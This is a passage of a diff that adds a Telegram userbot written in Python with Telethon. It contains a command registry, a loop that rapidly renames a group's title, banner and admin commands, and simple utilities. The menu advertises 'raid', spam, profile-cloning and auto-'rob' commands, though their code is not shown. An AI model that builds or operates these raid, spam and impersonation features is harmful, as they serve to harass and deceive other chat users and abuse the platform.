+"𓂃˖˳·˖ ִֶָ ⋆💜͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💜 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🖤͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🖤 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🤍͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🤍 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆🤎͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚🤎 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💖͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💖 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💗͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💗 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💓͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💓 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💞͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💞 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💕͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💕 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💘͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💘 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💝͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💝 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆💟͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚💟 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❣️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❣️ ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❤️‍🔥͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❤️‍🔥 ݁˖⭑.ᐟ",
+"𓂃˖˳·˖ ִֶָ ⋆❤️‍🩹͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ sꪶꪖꪜꫀ ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝗟𝗡𝗗 𝗖𝗛𝗢𝗢𝗦 -/- ⋆˚❤️‍🩹 ݁˖⭑.ᐟ"]
+
+# ────────────────────────────────────────────────
+#                   DECORATOR
+# ────────────────────────────────────────────────
+# ================= COMMAND REGISTRY =================
+
+commands = {}
+
+def register_cmd(name: str, needs_reply: bool = False, group_only: bool = False):
+
+    def decorator(func):
+
+        key = (name or "").lower().strip()
+
+        if not key:
+            raise ValueError("Command name cannot be empty")
+
+        if key in commands:
+            raise ValueError(f"Duplicate command registered: {key}")
+
+        commands[key] = {
+            "func": func,
+            "needs_reply": bool(needs_reply),
+            "group_only": bool(group_only),
+        }
+
+        return func
+
+    return decorator
+
+
+# ================= FASTGC ENGINE =================
+
+async def fast_title_edit(chat_id, title):
+
+    safe_title = (title or "").strip()[:255]
+
+    if not safe_title:
+        return False
+
+    try:
+        await bot(functions.channels.EditTitleRequest(
+            channel=chat_id,
+            title=safe_title
+        ))
+        return True
+
+    except Exception:
+
+        try:
+            await bot(functions.messages.EditChatTitleRequest(
+                chat_id=chat_id,
+                title=safe_title
+            ))
+            return True
+
+        except Exception as e:
+            print(f"[FastGC] Title edit failed → {str(e)[:80]}")
+            return False
+
+
+async def gc_fast_loop(chat_id):
+
+    try:
+
+        while True:
+
+            # ⭐ state validation
+            if not FASTGC_STATE.get("active"):
+                break
+
+            template = FASTGC_STATE.get("template")
+            if not template:
+                break
+
+            try:
+                emoji = random.choice(GC_FAST_EMOJIS)
+            except:
+                emoji = "⚡"
+
+            try:
+                new_title = template.replace("{emoji}", emoji)
+            except:
+                await asyncio.sleep(2)
+                continue
+
+            ok = await fast_title_edit(chat_id, new_title)
+
+            # ⭐ adaptive delay engine
+            try:
+                if ok:
+                    await asyncio.sleep(max(1, GC_FAST_INTERVAL))
+                else:
+                    await asyncio.sleep(5)
+            except:
+                await asyncio.sleep(3)
+
+    except asyncio.CancelledError:
+        # ⭐ silent cancel safe
+        return
+
+    except Exception as e:
+        print(f"[FastGC Loop Crash] → {str(e)[:80]}")
+
+# ────────────────────────────────────────────────
+#                   MENU (STYLISH) - UNCHANGED
+# ────────────────────────────────────────────────
+@register_cmd("menu")
+async def cmd_menu(event, _):
+    global menu_banner_msg
+    menu = """━━━〔 ✦ 𝐂ʜᴀᴍᴘᴜ 𝐆ᴏᴅ 𝐔sᴇʀʙᴏᴛ ✦ 〕━━━
+
+              👑 𝐎ᴡɴᴇʀ : 𝐂ʜᴀᴍᴘᴜ 👑
+
+╭─〔 👑 𝐀ᴅᴍɪɴ 𝐂ᴏᴍᴍᴀɴᴅs 〕─╮
+➤ .𝐀ᴅᴍɪɴs → sʜᴏᴡ ᴀᴅᴍɪɴ ʟɪsᴛ  
+➤ .𝐀ᴅᴅᴀᴅᴍɪɴ <reply / @id> → ᴀᴅᴅ ᴀᴅᴍɪɴ  
+➤ .𝐃ᴇʟᴀᴅᴍɪɴ <reply / @id> → ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ  
+╰────────────────────╯
+
+╭─〔 🔇 𝐌ᴜᴛᴇ & 𝐑ᴇsᴛʀɪᴄᴛ 〕─╮
+➤ .𝐌ᴜᴛᴇ <reply / @id> → ʟᴏᴄᴀʟ ᴍᴜᴛᴇ  
+➤ .𝐔ɴᴍᴜᴛᴇ <reply / @id> → ʟᴏᴄᴀʟ ᴜɴᴍᴜᴛᴇ  
+➤ .𝐆ᴍᴜᴛᴇ <reply / @id> → ɢʟᴏʙᴀʟ ᴍᴜᴛᴇ  
+➤ .𝐆ᴜɴᴍᴜᴛᴇ <reply / @id> → ɢʟᴏʙᴀʟ ᴜɴᴍᴜᴛᴇ  
+➤ .𝐌ᴜᴛᴇʟɪsᴛ → sʜᴏᴡ ᴍᴜᴛᴇ sᴛᴀᴛᴜs  
+➤ .𝐋ᴏᴄᴋ → ʟᴏᴄᴋ ɢʀᴏᴜᴘ  
+➤ .𝐔ɴʟᴏᴄᴋ → ᴜɴʟᴏᴄᴋ ɢʀᴏᴜᴘ  
+╰────────────────────╯
+
+╭─〔 🧹 𝐆ʀᴏᴜᴘ 𝐌ᴏᴅ 〕─╮
+➤ .𝐏ᴜʀɢᴇ <count> → ᴅᴇʟᴇᴛᴇ ᴍᴇssᴀɢᴇs  
+➤ .𝐓ʜʀᴏᴡ <reply / @id> → ᴋɪᴄᴋ ᴜsᴇʀ  
+➤ .𝐀ᴅᴅʙᴏᴛs <number> → ᴀᴅᴅ ʏᴏʀɪᴄʜɪ ʙᴏᴛs  
+╰────────────────────╯
+
+╭─〔 ⚔️ 𝐑ᴀɪᴅ 𝐄ɴɢɪɴᴇ 〕─╮
+➤ .𝐑ᴇᴘʟʏ <reply / @id> → sᴛᴀʀᴛ ʀᴇᴘʟʏ ʀᴀɪᴅ  
+➤ .𝐒ʀᴇᴘʟʏ <reply / @id> → sᴛᴏᴘ ʀᴇᴘʟʏ ʀᴀɪᴅ  
+➤ .𝐑ʀ <reply / @id> → ʀʀ + 🤣 ʀᴇᴀᴄᴛ  
+➤ .𝐒ʀʀ <reply / @id> → sᴛᴏᴘ ʀʀ  
+➤ .𝐅ʟᴀɢ <reply / @id> → ғʟᴀɢ ʀᴀɪᴅ  
+➤ .𝐒ғʟᴀɢ <reply / @id> → sᴛᴏᴘ ғʟᴀɢ  
+➤ .𝐇ʀʀ <reply / @id> → ʜᴇᴀʀᴛ ʀᴀɪᴅ  
+➤ .𝐒ʜʀʀ <reply / @id> → sᴛᴏᴘ ʜᴇᴀʀᴛ  
+➤ .𝐑ᴇᴘʟʏɢᴏᴅ <reply / @id> → ɢᴏᴅ ʀᴀɪᴅ  
+➤ .𝐒ɢᴏᴅ <reply / @id> → sᴛᴏᴘ ɢᴏᴅ  
+➤ .𝐑ᴇᴘʟʏʏᴏʀɪᴄʜɪ <text> <count> → ʟɪᴍɪᴛ ʀᴀɪᴅ  
+➤ .𝐒ʏᴏʀɪᴄʜɪ <reply / @id> → sᴛᴏᴘ ʟɪᴍɪᴛ  
+╰────────────────────╯
+
+╭─〔 💣 𝐒ᴘᴀᴍ & ⚡ 𝐅ᴀsᴛ 〕─╮
+➤ .𝐒ᴘʀᴀʏ <text> → sᴛᴀʀᴛ sᴘᴀᴍ  
+➤ .𝐃sᴘʀᴀʏ → sᴛᴏᴘ sᴘᴀᴍ  
+➤ .𝐅ᴀsᴛɢᴄ sᴇᴛ <template {emoji}> → ғᴀsᴛ ᴛɪᴛʟᴇ  
+➤ .𝐅ᴀsᴛɢᴄ sᴛᴏᴘ → sᴛᴏᴘ ғᴀsᴛ  
+╰────────────────────╯
+
+╭─〔 ❤️ 𝐀ᴜᴛᴏ 𝐒ʏsᴛᴇᴍ 〕─╮
+➤ .𝐀ʀ <emoji> → ᴀᴜᴛᴏ ʀᴇᴀᴄᴛ  
+➤ .𝐒ᴀʀ → sᴛᴏᴘ ᴀᴜᴛᴏ ʀᴇᴀᴄᴛ  
+╰────────────────────╯
+
+╭─〔 👤 𝐏ʀᴏғɪʟᴇ 𝐒ʏsᴛᴇᴍ 〕─╮
+➤ .𝐂ᴏᴘʏ <reply / @id> → ᴄʟᴏɴᴇ ᴘʀᴏғɪʟᴇ  
+➤ .𝐍ᴏʀᴍᴀʟ → ʀᴇsᴛᴏʀᴇ ᴏʀɪɢɪɴᴀʟ ᴘʀᴏғɪʟᴇ  
+╰────────────────────╯
+
+╭─〔 🛠️ 𝐓ᴏᴏʟ𝐬 〕─╮
+➤ .𝐓ᴛs <text> → ᴠᴏɪᴄᴇ ᴍsɢ  
+➤ .𝐐ʀᴄᴏᴅᴇ <text> → ɢᴇɴᴇʀᴀᴛᴇ ǫʀ  
+➤ .𝐅ᴀɴᴄʏ <text> → ғᴀɴᴄʏ sᴛʏʟᴇ  
+➤ .𝐒ᴛʏʟᴇ <text> → ᴛᴇxᴛ ғᴏʀᴍᴀᴛ  
+➤ .𝐄ᴍᴏᴊɪ <text> → ᴇᴍᴏᴊɪ sᴛʏʟᴇ  
+➤ .𝐂ᴀʟᴄ <expression> → ᴄᴀʟᴄᴜʟᴀᴛᴏʀ  
+➤ .𝐖ᴇᴀᴛʜᴇʀ <city> → ᴡᴇᴀᴛʜᴇʀ ʀᴇᴘᴏʀᴛ  
+➤ .𝐈ᴘ <ip> → ɪᴘ ʟᴏᴏᴋᴜᴘ  
+➤ .𝐒ʜᴏʀᴛ <url> → sʜᴏʀᴛ ʟɪɴᴋ  
+➤ .𝐌ᴜsɪᴄ <song> → ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴜsɪᴄ  
+╰────────────────────╯
+
+╭─〔 🧠 𝐍ᴏᴛᴇs 〕─╮
+➤ .𝐍ᴏᴛᴇsᴀᴅᴅ <text> → sᴀᴠᴇ ɴᴏᴛᴇ  
+➤ .𝐍ᴏᴛᴇsʟɪsᴛ → ʟɪsᴛ ɴᴏᴛᴇs  
+➤ .𝐍ᴏᴛᴇsᴅᴇʟᴇᴛᴇ <id> → ᴅᴇʟᴇᴛᴇ ɴᴏᴛᴇ  
+╰────────────────────╯
+
+╭─〔 🎮 𝐅ᴜɴ 〕─╮
+➤ .𝐏ɪɴɢ → ᴄʜᴇᴄᴋ ʟᴀᴛᴇɴᴄʏ  
+➤ .𝐒ᴛᴀᴛᴜs → ᴜsᴇʀʙᴏᴛ sᴛᴀᴛᴜs  
+➤ .𝐅ʟɪᴘ → ᴄᴏɪɴ ғʟɪᴘ  
+➤ .𝐃ɪᴄᴇ → ʀᴏʟʟ ᴅɪᴄᴇ  
+➤ .𝐈ɴғᴏ <reply / @id> → ᴜsᴇʀ ɪɴғᴏ  
+╰────────────────────╯
+
+╭─〔 ⚔️ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ 〕─╮
+➤ .𝐁ᴀᴋᴀ → ᴀᴜᴛᴏ ᴋɪʟʟ + ʀᴏʙ ᴀʟʟ ᴀᴄᴛɪᴠᴇ  
+➤ .𝐁ᴀᴋᴀʀᴏʙ → sᴛᴇᴀʟᴛʜ ʀᴏʙ (ɴᴏ ᴋɪʟʟs)  
+➤ .𝐁ᴀᴋᴀᴋɪʟʟ → ᴋɪʟʟ ᴏɴʟʏ ʀᴀɪᴅ  
+➤ .𝐁ᴀᴋᴀʙᴀʟ <reply/@id> → ᴄʜᴇᴄᴋ ʙᴀʟᴀɴᴄᴇ  
+➤ .𝐒ᴛᴏᴘʙᴀᴋᴀ → ɪɴsᴛᴀɴᴛʟʏ sᴛᴏᴘ ʀᴀɪᴅ  
+➤ .𝐁ᴀᴋᴀsᴛᴀᴛs → ʟᴀsᴛ ʀᴀɪᴅ sᴛᴀᴛs  
+╰────────────────────╯
+
+╭─〔 🖼️ 𝐁ᴀɴɴᴇʀ 〕─╮
+➤ .𝐁ᴀɴɴᴇʀ <reply media> → sᴇᴛ ᴍᴇɴᴜ ʙᴀɴɴᴇʀ  
+➤ .𝐑ᴇᴍʙᴀɴɴᴇʀ → ʀᴇᴍᴏᴠᴇ ʙᴀɴɴᴇʀ  
+╰────────────────────╯
+
+✦━━━━━━━━━━━━━━━━━━━━✦
+🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 🔥
+✦━━━━━━━━━━━━━━━━━━━━✦"""
+
+    await safe_edit(event, menu)
+    
+    if menu_banner_msg:
+        chat_id, msg_id = menu_banner_msg
+        try:
+            msg = await bot.get_messages(chat_id, ids=msg_id)
+            await bot.send_file(
+                event.chat_id,
+                file=msg.media,
+                caption="𝐂ʜᴀᴍᴘᴜ 𝐆ᴀᴡᴅ 𝐄ɴᴛᴇʀs ❤️‍🔥"
+            )
+        except:
+            pass
+            
+# ────────────────────────────────────────────────
+#                   COMMANDS
+# ────────────────────────────────────────────────
+
+# Banner
+@register_cmd("banner", needs_reply=True)
+async def cmd_banner(event, _):
+    global menu_banner_msg
+
+    reply = await event.get_reply_message()
+
+    # ─── MEDIA VALIDATION ENGINE ───
+    if not reply:
+        return await safe_edit(
+            event,
+            "❌ 𝐍ᴏ 𝐑ᴇᴘʟʏ\n👉 𝐑ᴇᴘʟʏ 𝐓ᴏ 𝐏ʜᴏᴛᴏ / 𝐕ɪᴅᴇᴏ"
+        )
+
+    if not reply.media:
+        return await safe_edit(
+            event,
+            "❌ 𝐈ɴᴠᴀʟɪᴅ 𝐌ᴇᴅɪᴀ\n👉 𝐎ɴʟʏ 𝐏ʜᴏᴛᴏ / 𝐕ɪᴅᴇᴏ"
+        )
+
+    await safe_edit(
+        event,
+        "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐁ᴀɴɴᴇʀ...\n━━━━━━━━━━━━━━━"
+    )
+
+    try:
+        # ─── FORWARD TRY FIRST (FAST PATH) ───
+        try:
+            saved = await reply.forward_to("me")
+        except Exception:
+            # ⭐ FORWARD RESTRICTED FALLBACK
+            file = await reply.download_media(file=bytes)
+            if not file:
+                return await safe_edit(event,
+                    "❌ 𝐌ᴇᴅɪᴀ 𝐃ᴏᴡɴʟᴏᴀᴅ 𝐅ᴀɪʟ"
+                )
+
+            bio = BytesIO(file)
+            bio.name = "banner"
+            saved = await bot.send_file("me", bio)
+
+        menu_banner_msg = (saved.chat_id, saved.id)
+        save_banner()
+
+        text = (
+            "🖼️ 𝐁ᴀɴɴᴇʀ 𝐒ᴇᴛ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"📌 𝐒ᴀᴠᴇᴅ 𝐈ᴅ → `{saved.id}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except FloodWaitError as fw:
+        await safe_edit(event,
+            f"⏳ 𝐅ʟᴏᴏᴅ 𝐖ᴀɪᴛ → {fw.seconds}s"
+        )
+
+    except RPCError as e:
+        await safe_edit(event,
+            f"❌ 𝐓ɢ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐁ᴀɴɴᴇʀ 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+
+
+@register_cmd("rembanner")
+async def cmd_rembanner(event, _):
+    global menu_banner_msg
+
+    if not menu_banner_msg:
+        return await safe_edit(event,
+            "⚠️ 𝐍ᴏ 𝐁ᴀɴɴᴇʀ 𝐒ᴇᴛ"
+        )
+
+    await safe_edit(
+        event,
+        "⚡ 𝐑ᴇᴍᴏᴠɪɴɢ 𝐁ᴀɴɴᴇʀ...\n━━━━━━━━━━━━━━━"
+    )
+
+    try:
+        chat_id, msg_id = menu_banner_msg
+
+        try:
+            await bot.delete_messages(chat_id, [msg_id])
+        except Exception:
+            # ⭐ banner already manually deleted
+            pass
+
+        menu_banner_msg = None
+        save_banner()
+
+        text = (
+            "🗑️ 𝐁ᴀɴɴᴇʀ 𝐑ᴇᴍᴏᴠᴇᴅ\n"
+            "━━━━━━━━━━━━━━━"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except FloodWaitError as fw:
+        await safe_edit(event,
+            f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s"
+        )
+
+    except RPCError as e:
+        await safe_edit(event,
+            f"❌ 𝐓ɢ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐑ᴇᴍᴏᴠᴇ 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+        
+# Admin Commands (Updated)
+@register_cmd("addadmin", needs_reply=True)
+async def cmd_addadmin(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ\n👉 𝐑ᴇᴘʟʏ / @username / ID"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐀ᴅᴍɪɴ 𝐀ᴅᴅ...\n━━━━━━━━━━━━━━━"
+        )
+
+        added = []
+        already = []
+        skipped_owner = []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid == OWNER_ID:
+                skipped_owner.append(str(uid))
+                continue
+
+            if uid in admins:
+                already.append(str(uid))
+            else:
+                admins.add(uid)
+                added.append(str(uid))
+
+        try:
+            save_admins()
+        except Exception:
+            pass
+
+        parts = []
+
+        if added:
+            parts.append(
+                f"✅ 𝐀ᴅᴍɪɴ 𝐀ᴅᴅᴇᴅ → `{', '.join(added)}`"
+            )
+
+        if already:
+            parts.append(
+                f"⚠️ 𝐀ʟʀᴇᴀᴅʏ 𝐀ᴅᴍɪɴ → `{', '.join(already)}`"
+            )
+
+        if skipped_owner:
+            parts.append(
+                f"👑 𝐎ᴡɴᴇʀ 𝐒ᴋɪᴘᴘᴇᴅ → `{', '.join(skipped_owner)}`"
+            )
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇs 𝐌ᴀᴅᴇ")
+
+        text = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except FloodWaitError as fw:
+        await safe_edit(event,
+            f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s"
+        )
+    except RPCError as e:
+        await safe_edit(event,
+            f"❌ 𝐓ɢ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐀ᴅᴍɪɴ 𝐀ᴅᴅ 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+
+
+@register_cmd("deladmin", needs_reply=True)
+async def cmd_deladmin(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ\n👉 𝐑ᴇᴘʟʏ / @username / ID"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐀ᴅᴍɪɴ 𝐑ᴇᴍᴏᴠᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        removed = []
+        not_admin = []
+        skipped_owner = []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid == OWNER_ID:
+                skipped_owner.append(str(uid))
+                continue
+
+            if uid in admins:
+                admins.remove(uid)
+                removed.append(str(uid))
+            else:
+                not_admin.append(str(uid))
+
+        try:
+            save_admins()
+        except Exception:
+            pass
+
+        parts = []
+
+        if removed:
+            parts.append(
+                f"🗑️ 𝐀ᴅᴍɪɴ 𝐑ᴇᴍᴏᴠᴇᴅ → `{', '.join(removed)}`"
+            )
+
+        if not_admin:
+            parts.append(
+                f"⚠️ 𝐍ᴏᴛ 𝐀ᴅᴍɪɴ → `{', '.join(not_admin)}`"
+            )
+
+        if skipped_owner:
+            parts.append(
+                f"👑 𝐎ᴡɴᴇʀ 𝐏ʀᴏᴛᴇᴄᴛᴇᴅ → `{', '.join(skipped_owner)}`"
+            )
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇs 𝐌ᴀᴅᴇ")
+
+        text = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except FloodWaitError as fw:
+        await safe_edit(event,
+            f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s"
+        )
+    except RPCError as e:
+        await safe_edit(event,
+            f"❌ 𝐓ɢ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐀ᴅᴍɪɴ 𝐑ᴇᴍᴏᴠᴇ 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+
+
+@register_cmd("admins")
+async def cmd_admins(event, _):
+    try:
+        await safe_edit(
+            event,
+            "⚡ 𝐅ᴇᴛᴄʜɪɴɢ 𝐀ᴅᴍɪɴ 𝐋ɪsᴛ...\n━━━━━━━━━━━━━━━"
+        )
+
+        if admins:
+            admin_list = "\n".join(
+                f"• `{a}`" for a in sorted(admins)
+            )
+        else:
+            admin_list = "⚠️ 𝐍ᴏ 𝐄xᴛʀᴀ 𝐀ᴅᴍɪɴs"
+
+        txt = (
+            "👑 𝐀ᴅᴍɪɴ 𝐋ɪsᴛ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"👑 𝐎ᴡɴᴇʀ → `{OWNER_ID}`\n\n"
+            f"{admin_list}\n\n"
+            f"📊 𝐓ᴏᴛᴀʟ → `{len(admins)}`"
+        )
+
+        await safe_edit(event, txt)
+
+    except FloodWaitError as fw:
+        await safe_edit(event,
+            f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s"
+        )
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐀ᴅᴍɪɴ 𝐋ɪsᴛ 𝐄ʀʀ → `{str(e)[:50]}`"
+        )
+
+# Basic Commands (Unchanged)
+@register_cmd("ping")
+async def cmd_ping(event, _):
+    try:
+        t0 = time.perf_counter()
+
+        # ─── MESSAGE DISPATCH SAFE ───
+        try:
+            if event.out:
+                msg = await event.edit("🏓 𝐏ɪɴɢ...")
+            else:
+                msg = await event.reply("🏓 𝐏ɪɴɢ...")
+        except:
+            msg = None
+
+        t1 = time.perf_counter()
+        ms = round((t1 - t0) * 1000)
+
+        # ─── RESPONSE EDIT SAFE ───
+        try:
+            if msg:
+                await msg.edit(f"🏓 𝐏ᴏɴɢ → `{ms} ms`")
+            else:
+                await event.reply(f"🏓 𝐏ᴏɴɢ → `{ms} ms`")
+        except:
+            pass
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐏ɪɴɢ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("status")
+async def cmd_status(event, _):
+    try:
+        now = time.time()
+
+        # ─── START TIME CORRUPTION SAFE ───
+        try:
+            uptime = int(now - START_TIME)
+            if uptime < 0:
+                uptime = 0
+        except:
+            uptime = 0
+
+        # ─── ADMIN STORAGE SAFE ───
+        try:
+            admin_count = len(admins)
+        except:
+            admin_count = 0
+
+        txt = (
+            "✅ 𝐔sᴇʀʙᴏᴛ 𝐒ᴛᴀᴛᴜs\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"⏱️ 𝐔ᴘᴛɪᴍᴇ → `{uptime}s`\n"
+            f"👑 𝐀ᴅᴍɪɴs → `{admin_count}`\n"
+            f"⚙️ 𝐌ᴏᴅᴇ → `Operational`"
+        )
+
+        try:
+            if event.out:
+                await safe_edit(event, txt)
+            else:
+                await event.reply(txt)
+        except:
+            pass
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐒ᴛᴀᴛᴜs 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("flip")
+async def cmd_flip(event, _):
+    try:
+        # ─── RANDOM SAFE ───
+        try:
+            result = random.choice(["🪙 𝐇ᴇᴀᴅs", "🪙 𝐓ᴀɪʟs"])
+        except:
+            result = "🪙 𝐇ᴇᴀᴅs"
+
+        text = (
+            "🎲 𝐂ᴏɪɴ 𝐅ʟɪᴘ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"👉 𝐑ᴇsᴜʟᴛ → {result}"
+        )
+
+        try:
+            if event.out:
+                await safe_edit(event, text)
+            else:
+                await event.reply(text)
+        except:
+            pass
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐅ʟɪᴘ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("dice")
+async def cmd_dice(event, _):
+    try:
+        # ─── RANDOM SAFE ───
+        try:
+            num = random.randint(1, 6)
+        except:
+            num = 1
+
+        text = (
+            "🎲 𝐃ɪᴄᴇ 𝐑ᴏʟʟ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"👉 𝐑ᴇsᴜʟᴛ → `{num}`"
+        )
+
+        try:
+            if event.out:
+                await safe_edit(event, text)
+            else:
+                await event.reply(text)
+        except:
+            pass
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
